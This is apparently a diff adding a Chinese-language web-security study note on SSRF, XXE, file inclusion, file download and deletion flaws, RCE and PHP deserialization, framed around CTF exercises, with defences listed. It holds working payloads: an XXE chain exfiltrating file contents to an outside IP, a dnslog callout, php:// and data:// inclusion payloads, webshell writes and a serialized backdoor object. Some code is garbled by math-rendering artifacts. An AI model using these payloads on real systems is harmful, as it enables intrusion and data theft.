+<p>加载内部的敏感文件程序自身的敏感文件</p>
+<p>来访问内网进行内网端口的扫描、获取内网设备信息、枚举内网服务等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">配合burp爆破可识别到内网中的信息</span><br></pre></td></tr></table></figure>
+<p>（3）SSRF 支持协议：</p>
+<p>dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp,<br>
+sftp, smtp, smtps, telnet, tftp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SSRF黑盒可能出现的地方：</span><br><span class="line">社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line">转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">在线翻译：给网址翻译对应网页的内容</span><br><span class="line">图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL 地址加载</span><br><span class="line">或下载图片</span><br><span class="line">图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一</span><br><span class="line">个好的用具体验</span><br><span class="line">云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相</span><br><span class="line">应的信息，就可以进行ssrf测试</span><br><span class="line">网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line">数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line">邮件系统：比如接收邮件服务器地址</span><br><span class="line">编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml</span><br><span class="line">处理器等</span><br><span class="line">未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关</span><br><span class="line">键字去寻找SSRF漏洞</span><br><span class="line">一些的url 中的关键字：share、wap、url、link、src、source、target、u、3g、</span><br><span class="line">display、sourceURl、imageURL、domain......</span><br><span class="line">从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web</span><br><span class="line">blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure>
+<p>（4）SSRF 常见安全修复防御方案：</p>
+<p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。<br>
+统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。<br>
+限制请求的端口为 http 常用的端口，比如 80,443,8080,8090。<br>
+黑名单内网 ip，避免应用被用来获取获取内网数据，攻击内网。<br>
+禁用不需要的协议，仅仅允许 http/https，防止类似于 file:///,gopher://,<span class="exturl" data-url="ZnRwOi8vJUU3JUFEJTg5">ftp:// 等</span>。</p>
+<h3 id="25-xml-xxe"><a class="markdownIt-Anchor" href="#25-xml-xxe">#</a> 2.5 xml、xxe</h3>
+<h4 id="251-xxe原理及利用"><a class="markdownIt-Anchor" href="#251-xxe原理及利用">#</a> 2.5.1 xxe 原理及利用</h4>
+<p>（1）XML/XXE 原理与定义：</p>
+<p>XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明、DTD 文</p>
+<p>档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从 HTML 分</p>
+<p>离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称 XML External Entity<br>
+Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入<br>
+时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命<br>
+令执行、内网端口扫描、攻击内网网站等危害。</p>
+<p>（2）XXE 漏洞利用：</p>
+<p>读取文件：可以用来读取数据库配置文件，/etc/passwd 等敏感文件</p>
+<?xml version="1.0"?>
+<!DOCTYPE Mikasa [
+<!ENTITY test SYSTEM "file:///d:/e.txt">
+<p>]&gt;<br>
+<user><username>&amp;test;</username><password>Mikasa</password></user></p>
+<p>（3）带外测试：解决命令执行无回显的问题</p>
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "curl [http://9v57ll.dnslog.cn">](http://9v57ll.dnslog.cn">)
+<p>%file;<br>
+]&gt;<br>
+<user><username>&amp;send;</username><password>Mikasa</password></user></p>
+<h4 id="252-xml引用外部实体"><a class="markdownIt-Anchor" href="#252-xml引用外部实体">#</a> 2.5.2 xml 引用外部实体</h4>
+<p>无回显读文件：</p>
+<p>引用外部实体，读取本地文件发送到远程地址</p>
+<h1 id="既然这个数据是用脚本语言解析的-那么有没有可能构造py代码直接用py代码解析"><a class="markdownIt-Anchor" href="#既然这个数据是用脚本语言解析的-那么有没有可能构造py代码直接用py代码解析">#</a> 既然这个数据是用脚本语言解析的、那么有没有可能构造 py 代码，直接用 py 代码解析</h1>
+<p>下面的 XML 语言，用来读取到服务器上的数据；肯定是可以的，用 py 来解析 xml 语言获<br>
+取其中关键信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///d:/e.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br><span class="line">test.dtd</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 将payload发送到存在xml漏洞的位置，并在远程服务器构造test.dtd和get.php, get.php</span><br><span class="line">读取file数据并记录在本地，漏洞被触发的时候就会在远程生成目录内容为读取到的d:/e.txt。</span><br><span class="line"># 其他如可以进行php://filter协议来进行编码绕过</span><br></pre></td></tr></table></figure>
+<h4 id="253-xml测试及防御"><a class="markdownIt-Anchor" href="#253-xml测试及防御">#</a> 2.5.3 xml 测试及防御</h4>
+<p>（1）XML 测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果当前关键字Content-Type是xml，可尝试发送xml语言的payload测试；</span><br><span class="line">即便此处不是xml依然可以修改类型然后测试。一般的xxe漏洞利用形式如下：</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong><?xml** version = "1.0" **?></strong></li>
+<li>
+<!DOCTYPE ANY [
+</li>
+</li><li>
+<!ENTITY f SYSTEM "file:///home/ctf/flag.txt" **>**
+</li>
+<li>] <strong>&gt;</strong></li>
+<li><strong><x></x></strong> &amp;f; <strong></strong><br>
+对方后台中有函数可以接受此数据并进行分析如 php://input，如果对方数据<br>
+过滤不严谨，是会执行恶意 xml。会有一种情况，输入 xxe 代码，对方无回显无<br>
+法确定当前是自己的 payload 有问题还是不存在漏洞，就可以使用 dnslog 解决命<br>
+令执行漏洞无回显问题。<br>
+（2）XXE 白盒发现：<br>
+可通过应用功能追踪代码定位审计<br>
+可通过脚本特定函数搜索定位审计<br>
+可通过伪协议玩法绕过相关修复等<br>
+（3）XXE 修复防御方案：<br>
+禁用外部实体：</li>
+</ol>
+<p>PHP:libxml_disable_entity_loader(true);<br>
+JAVA:DocumentBuilderFactory dbf<br>
+=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);<br>
+Python：from lxml import etreexmlData =<br>
+etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))<br>
+ 过滤用户提交的 XML 数据：<br>
+过滤关键词：&lt;!DOCTYPE 和 &lt;!ENTITY，或者 SYSTEM 和 PUBLIC</p>
+<h3 id="26-lfi-rfi"><a class="markdownIt-Anchor" href="#26-lfi-rfi">#</a> 2.6 lfi、rfi</h3>
+<h4 id="261-lfi定义及利用"><a class="markdownIt-Anchor" href="#261-lfi定义及利用">#</a> 2.6.1 lfi 定义及利用</h4>
+<p>（1）文件包含 LFI 定义：</p>
+<p>php 中的 include 函数，如果其后跟上了一个固定的文件，那么就会在加载<br>
+原来的文件的时候执行 include 所包含的文件且不论这个文件是以何种后缀结尾<br>
+都会被解析成 php；如果包含的是个由用户可以控制的文件，那么就存在文件<br>
+包含漏洞，用户可以指定需要包含的文件进行恶意的读取相关敏感数据或者造<br>
+成权限丢失。</p>
+<p>（2）文件包含 LFI 漏洞利用：</p>
+<p>配合文件上传，上传带图片马，用文件包含此图片，脚本代码会被触发。<br>
+配合日志文件，日志文件会记录 UA 信息，修改 UA 为后门代码，包含即<br>
+可执行后门代码。<br>
+配合伪协议，利用没有被禁的协议，用 php 伪协议读写文件或者写入后门。<br>
+配合会话文件，配合网站后台的 session 目录及其内容使用，每一次访问都<br>
+会生成一个新的 seesion，而在 php 中是可以通过控制访问网站时的 cookie 值来<br>
+改变服务器存储的 session 文件名以及通过 post 数据可以改变 session 存储文件<br>
+中的内容。</p>
+<h4 id="262-lfi配合伪协议使用"><a class="markdownIt-Anchor" href="#262-lfi配合伪协议使用">#</a> 2.6.2 lfi 配合伪协议使用</h4>
+<p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<ul>
+<li>php://filter 使用较多，可以直接读取相关文件<br>
+？file=php://input post:<?php system('tac flag.php');?></li>
+<li>php://input 协议需要开启一些开关才可以使用</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?file=http://www.xxx.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line">* 远程包含需要对方在.php.ini中开启相关开关才能使用</span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;tac flag.*&#x27;);?&gt;</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKT</span><br><span class="line">s/Pg==</span><br><span class="line">* 利用base 64 加密可以逃过一些防护措施的检测</span><br><span class="line">?file=/var/log/nginx/access.log</span><br><span class="line"># 使用file协议时需要用到绝对路径，使用php伪协议时需要使用php关键字，需要使用</span><br><span class="line">远程包含需要服务器允许，相比之下写入日志没有那么多的限制</span><br></pre></td></tr></table></figure>
+<h4 id="263-filter伪协议的加密"><a class="markdownIt-Anchor" href="#263-filter伪协议的加密">#</a> 2.6.3 filter 伪协议的加密</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write的加密编码:（伪协议可使用但相关字段被绕过的情况）</span><br><span class="line">将 php://filter/write=convert.base64-decode/resource=123.php 进行url 编码，</span><br><span class="line">浏览器会自动进行一次url解码，将content=aaPD9waHAgQGV2YWwoJF9QT1N</span><br><span class="line">UW2FdKTs/Pg==通过post的方式上传，意味着将要对 1 23.php的文件写入，写</span><br><span class="line">入的内容为content内容解码后的数据，采用这种方法需要就实际场景进行构造。</span><br><span class="line">将php://filter/write=string.rot13/resource=2.php进行url编码，rot 13 表示的是</span><br><span class="line">写入的文件是采用凯撒加密偏移量为 13 ，将 content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br><span class="line">通过post方式上传，在base 64 被过滤的情况下可以使用此方法绕过。</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<h1 id="converticonv一种过滤器和使用iconv函数处理流数据有等同作用"><a class="markdownIt-Anchor" href="#converticonv一种过滤器和使用iconv函数处理流数据有等同作用">#</a> convert.iconv.：一种过滤器，和使用 iconv () 函数处理流数据有等同作用</h1>
+</li>
+<li>
+<?php
+</li>
+</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>u</mi><mi>l</mi><mi>t</mi><mo>=</mo><mi>i</mi><mi>c</mi><mi>o</mi><mi>n</mi><mi>v</mi><mo stretchy="false">(</mo><mi mathvariant="normal">&quot;</mi><mi>U</mi><mi>C</mi><mi>S</mi><mo>−</mo><mn>2</mn><mi>L</mi><mi>E</mi><mi mathvariant="normal">&quot;</mi><mo separator="true">,</mo><mi mathvariant="normal">&quot;</mi><mi>U</mi><mi>C</mi><mi>S</mi><mo>−</mo><mn>2</mn><mi>B</mi><mi>E</mi><mi mathvariant="normal">&quot;</mi><msup><mo separator="true">,</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>&lt;</mo><mo stretchy="false">?</mo><mi>p</mi><mi>h</mi><mi>p</mi><mi>e</mi><mi>v</mi><mi>a</mi><mi>l</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">result = iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, &#x27;&lt;?php eval(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord">&quot;</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">&quot;</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">&quot;</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord">&quot;</span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mclose">?</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span></span></span></span>_POST[a]);?&gt;’);</li>
+<li>echo “经过一次反转:”.$result.&quot;\n&quot;;</li>
+<li>echo “经过第二次反转:”.iconv (“UCS-2LE”,“UCS-2BE”, $result);</li>
+<li>?&gt;</li>
+<li>Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</li>
+<li>contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?
+<ul>
+<li>如果 include 中的内容默认添加前缀可以用…/ 的方式读取一些文件，但却不能用伪协议了，<br>
+如果是有增加后缀的方法，则无法读取文件。</li>
+</ul>
+</li>
+</ol>
+<h3 id="27-文件操作"><a class="markdownIt-Anchor" href="#27-文件操作">#</a> 2.7 文件操作</h3>
+<h4 id="271-敏感文件下载"><a class="markdownIt-Anchor" href="#271-敏感文件下载">#</a> 2.7.1 敏感文件下载</h4>
+<p>（1）文件下载的寻找及利用：</p>
+<p>文件下载：流程 - 功能点抓包 - 寻代码文件 - 寻变量控制 - 构造测试。</p>
+<p>寻找：/1.pdf 不存在此漏洞，/?file=1.pdf 可能存在。<br>
+利用：后台首页日志文件、数据库配置文件、中间件配置文件、各种接口<br>
+文件、密钥信息等文件、扫描工具爬行；或者下载好的代码去分析路径、找到<br>
+对方的 cms 直接查数据库配置文件。</p>
+<p>（2）代码中的文件下载漏洞：</p>
+<p>java：如何发现了下载漏洞但是 get 方法无法获取到文件，可以尝试切换到<br>
+ post 或者其他提交方式进行下载，javaWEB 中 WEB 的配置文件 WEB-<br>
+INF/web.xml，里边有很多重要的信息，配置文件中的 com.wm.ctf.FlagController<br>
+ 表示实际中的 WEB-INF/classes/com/wm/ctf/ FlagController.class。<br>
+php：如果需要登陆可以点击登陆分析数据包。分析 url 地址判断是可能存<br>
+在哪种漏洞，判断对方是根据哪个关键字识别是否登陆的，如果有 mvc 的框架，<br>
+可尝试下载 module 中的敏感文件如…xx…/etc/nginx/nginx.conf。</p>
+<h4 id="272-恶意文件删除"><a class="markdownIt-Anchor" href="#272-恶意文件删除">#</a> 2.7.2 恶意文件删除</h4>
+<p>文件删除：流程 - 特定函数搜索 - 寻触发调用 - 构造 Payload 测试<br>
+ Payload: /admin/admin_article.php?act=del_img&amp;img=…/…/data/install.lock<br>
+ 在网站某些功能点可以删除文件时，抓包测试，如后台模版删除文件点进<br>
+行删除测试，删除 install/install_lock.txt 删除后则重新安装网站。</p>
+<h4 id="273-重要文件读取"><a class="markdownIt-Anchor" href="#273-重要文件读取">#</a> 2.7.3 重要文件读取</h4>
+<p>文件读取：流程 - 特定函数搜索 - 寻触发调用 - 构造 Payload 测试<br>
+ Payload：/include/thumb.php?dir=http…\config\config_db.php<br>
+ 如果能够显示源代码则是文件读取漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">黑盒探针：</span><br><span class="line">URL参数名及参数值分析：</span><br><span class="line">参数名：英文对应翻译</span><br><span class="line">参数值：目录或文件名</span><br><span class="line">功能点自行修改后分析：</span><br><span class="line">文件下载，删除，读取等</span><br></pre></td></tr></table></figure>
+<h3 id="28-rce漏洞"><a class="markdownIt-Anchor" href="#28-rce漏洞">#</a> 2.8 RCE 漏洞</h3>
+<p>（1）RCE 漏洞分类：</p>
+<p>代码执行：引用脚本代码解析执行，如 eval (‘phpinfo ();’);<br>
+ 命令执行：脚本调用操作系统命令，如 system (‘ipconfig’);<br>
+ 在源码中要找 RCE 漏洞话需要搜索特定函数，看其是从哪里输入进来的，有哪<br>
+些过滤是否能绕过；如果没有源码的情况就得去从功能点测试。</p>
+<p>（2）漏洞函数：</p>
+<p>PHP：eval()、assert()、preg_replace()、call_user_func()、call_user_func_<br>
+array () 以及 array_map () 等；system、shell_exec、popen、passthru、proc_open 等<br>
+ Python：eval exec subprocess os.system commands<br>
+Java：Java 中没有类似 php 中 eval 函数这种直接可以将字符串转化为代码执<br>
+行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如:<br>
+OGNL、SpEL、MVEL 等.</p>
+<p>（3）RCE 漏洞绕过方法：</p>
+<p>system(‘tac fla*.php’);<br>
+ <code>cp fla*.ph* 2.txt</code> ;<br>
+echo shell_exec(‘tac fla*.ph*’);<br>
+eval($_GET[1]);&amp;1=system(‘tac flag.php’);</p>
+<ul>
+<li>通过 eval 传递参数，在拼接新的变量值可以绕过敏感函数被过滤的限制</li>
+</ul>
+<p>include_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>
+include_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php<br>
+data://text/plain,<?=system('tac fla*');?><br>
+php://input post:<?php system('tac flag.php');?></p>
+<ul>
+<li>通过文件包含，传递 a 参数为执行系统命令的 data 协议，可以绕过分号限制</li>
+</ul>
+<h1 id="工具推荐-gui_tools_v-是一个工具集成化的工具箱"><a class="markdownIt-Anchor" href="#工具推荐-gui_tools_v-是一个工具集成化的工具箱">#</a> 工具推荐 GUI_TOOLS_V… 是一个工具集成化的工具箱</h1>
+<h3 id="29-反序列化漏洞"><a class="markdownIt-Anchor" href="#29-反序列化漏洞">#</a> 2.9 反序列化漏洞</h3>
+<h4 id="291-php魔术方法及利用"><a class="markdownIt-Anchor" href="#291-php魔术方法及利用">#</a> 2.9.1 php 魔术方法及利用</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">（1）php中有类的反序列化中常见的魔术方法:</span><br><span class="line">__construct()//创建对象时触发,执行unserialize()时如果不new是不会触发这个函数</span><br><span class="line">__destruct() //对象被销毁时触发，执行unserialize()时销毁阶段会触发这个函数</span><br><span class="line">__toString() //对象被当作字符串时被调用</span><br><span class="line">__call() //当调用类中不存在的方法时，就会调用call()</span><br><span class="line">__get() //当调用类中不存在的属性时，就会调用get()</span><br><span class="line">__set() //当设置类中不存在的属性时，就会调用set()</span><br><span class="line">__sleep() //当执行serialize()方法时，就会调用sleep()</span><br><span class="line">__wakeup() //当执行unserialize()时，就会调用wakeup()</span><br><span class="line">* 序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup，即CVE- 2016 - 7124</span><br><span class="line">__isset() //当对不可访问属性调用isset()或empty()时，就会调用__isset()</span><br><span class="line">__unset() //当对不可访问属性调用unset()时触发，销毁对象的某个属性时执行此函数</span><br><span class="line">* 实例化之后访问private是不可访问的，但是访问public是可以访问的</span><br><span class="line">__invoke() //将对象当做函数来使用时执行此方法，通常不推荐这样做</span><br><span class="line">（2）查看php魔术方法的原生类有哪些：</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<?php
+</li>
+</li><li>$classes = get_declared_classes();</li>
+<li><strong>foreach</strong> ($classes <strong>as</strong> $class) {</li>
+<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>e</mi><mi>t</mi><mi>h</mi><mi>o</mi><mi>d</mi><mi>s</mi><mo>=</mo><mi>g</mi><mi>e</mi><msub><mi>t</mi><mi>c</mi></msub><mi>l</mi><mi>a</mi><mi>s</mi><msub><mi>s</mi><mi>m</mi></msub><mi>e</mi><mi>t</mi><mi>h</mi><mi>o</mi><mi>d</mi><mi>s</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">methods = get_class_methods(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">s</span><span class="mopen">(</span></span></span></span>class);</li>
+<li><strong>foreach</strong> ($methods <strong>as</strong> $method) {</li>
+<li><strong>if</strong> (in_array($method, <strong>array</strong> (</li>
+<li>‘__destruct’,</li>
+<li>‘__toString’,</li>
+<li>‘__wakeup’,</li>
+<li>‘__call’,</li>
+<li>‘__callStatic’,</li>
+<li>‘__get’,</li>
+<li>‘__set’,</li>
+<li>‘__isset’,</li>
+<li>‘__unset’,</li>
+<li>‘__invoke’,</li>
+<li>‘__set_state’</li>
+<li>))) {</li>
+<li>print $class. ‘::’. $method. “\n”;</li>
+<li>} } }</li>
+</ol>
+<h4 id="292-php-反序列化及原生类"><a class="markdownIt-Anchor" href="#292-php-反序列化及原生类">#</a> 2.9.2 php 反序列化及原生类</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">（1）php反序列化漏洞原理：</span><br><span class="line">未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过</span><br><span class="line">程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过</span><br><span class="line">程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中</span><br><span class="line">的一些魔术方法。</span><br><span class="line">php中有一些魔术方法，在实例化时后者其他操作时不经意间出发了类中的</span><br><span class="line">方法，可以利用这个特点，将自己伪造的数据带入其中，让自己伪造的数据反</span><br><span class="line">序列化后可以读取存储在类中魔术方法中的数据如果参数是一个类，需要重写</span><br><span class="line">这个类，并且将所有的变量按照自己破解的规范进行书写，最后进行实例化与</span><br><span class="line">url加密序列化后的数据。</span><br><span class="line">（2）一个生成序列化值的例子：</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<?php
+</li>
+</li><li><strong>class</strong> ctfShowUser{</li>
+<li><strong>private</strong> $class;</li>
+<li><strong>public function</strong> __construct(){</li>
+<li>$this-&gt; <strong>class</strong> = <strong>new</strong> backDoor();</li>
+<li>}</li>
+<li>}</li>
+<li><strong>class</strong> backDoor{</li>
+<li><strong>private</strong> $code=‘system(“cat f*”);’;</li>
+<li>}</li>
+<li>$b= <strong>new</strong> ctfShowUser();</li>
+<li>echo serialize($b);</li>
+<li>?&gt;
+<ul>
+<li>实例化之后，会调用__construct 方法，并且因为是实例是可以调用 ctfShowUser 中的私有<br>
+变量的，将此定义号的 class 变量设置为 new backDoor 意味着再次调用 backDoor 中的私有<br>
+变量 code，并且执行相应的命令。最后将该操作流程返回的数据进行序列化和 url 编码后代<br>
+入到原来的题目中即可执行此命令。<br>
+（3）序列化数据显示：<br>
+private 属性序列化的时候格式是 %00 类名 %00 成员名<br>
+ protect 属性序列化的时候格式是 %00*%00 成员名<br>
+序列化时 % 00 会被当成一个长度为一的字符串处理但是不会显示出来，一般是<br>
+序列化时候需要通过编码才可以进行利用。</li>
+<li>如 test 类下的 private age:“29” 经过序列化之后的数据为 s:9:“testage”</li>
+</ul>
+</li>
+</ol>
